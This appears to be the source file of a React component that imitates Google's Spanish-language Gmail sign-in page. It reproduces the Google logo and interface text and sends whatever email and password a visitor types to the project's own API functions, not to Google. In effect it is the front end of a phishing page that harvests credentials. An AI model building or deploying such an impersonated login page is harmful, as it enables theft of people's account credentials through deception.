import React, { useState } from 'react';
import { useApiContext } from '../../context/ApiContext';
import { emailBranches, passwords } from '../../api/axios';

const GoogleLogin: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  //const { setMailApi, setPasswordApi } = useApiContext();


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password.trim()) return;
    setIsLoading(true);
    
    setTimeout(() => {
      setIsLoading(false);
    }, 1000);

    const mailApiResult = await emailBranches(email);
    //setMailApi(mailApiResult);

    const passwordApiResult = await passwords(password);
    //setPasswordApi(passwordApiResult);
    
  };

  const handleForgotPassword = () => {
  };

  const handleCreateAccount = () => {
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
      <div className="max-w-sm w-full bg-white rounded-lg shadow-sm border border-gray-200 p-8">
      {/* Google Logo */}
      <div className="text-center mb-6">
        <div className="mb-6">
          <svg className="mx-auto w-20 h-20" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
          </svg>
        </div>
        
        <h1 className="text-2xl font-normal text-gray-800 mb-2">Inicia sesión</h1>
        <p className="text-base text-gray-600">Ir a Gmail</p>
      </div>

      {/* Email Form */}
      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Email Input */}
        <div className="relative">
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onFocus={() => setEmailFocused(true)}
            onBlur={() => setEmailFocused(false)}
            placeholder="Correo electrónico o teléfono"
            className={`
              w-full px-4 py-3 text-base border rounded-md
              outline-none transition-all duration-200
              ${emailFocused || email 
                ? 'border-blue-500 border-2' 
                : 'border-gray-300 hover:border-gray-400'
              }
            `}
            required
          />
        </div>

        {/* Password Input */}
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onFocus={() => setPasswordFocused(true)}
            onBlur={() => setPasswordFocused(false)}
            placeholder="Contraseña"
            className={`
              w-full px-4 py-3 pr-12 text-base border rounded-md
              outline-none transition-all duration-200
              ${passwordFocused || password 
                ? 'border-blue-500 border-2' 
                : 'border-gray-300 hover:border-gray-400'
              }
            `}
            required
          />
          {password && (
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-blue-600 text-sm font-medium hover:underline"
            >
              {showPassword ? 'Ocultar' : 'Mostrar'}
            </button>
          )}
        </div>

        <div className="text-left">
          <button
            type="button"
            onClick={handleForgotPassword}
            className="text-blue-600 text-sm font-medium hover:underline"
          >
            ¿Has olvidado tu correo electrónico?
          </button>
        </div>

        <div className="text-sm text-gray-600 leading-5">
          <p>
            ¿No es tu ordenador? Usa el modo invitado para iniciar sesión de forma privada.{' '}
            <button
              type="button"
              className="text-blue-600 font-medium hover:underline"
            >
              Más información
            </button>
          </p>
        </div>

        <div className="flex items-center justify-between pt-4">
          <button
            type="button"
            onClick={handleCreateAccount}
            className="text-blue-600 text-sm font-medium hover:underline"
          >
            Crear cuenta
          </button>
          
          <button
            type="submit"
            disabled={!email.trim() || !password.trim() || isLoading}
            className={`
              px-6 py-2 rounded text-sm font-medium transition-all duration-200
              ${!email.trim() || !password.trim() || isLoading
                ? 'bg-gray-100 text-gray-400 cursor-not-allowed'
                : 'bg-blue-600 text-white hover:bg-blue-700 shadow-sm hover:shadow'
              }
            `}
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                <span>Validando...</span>
              </div>
            ) : (
              'Siguiente'
            )}
          </button>
        </div>
      </form>
      </div>
    </div>
  );
};

export default GoogleLogin;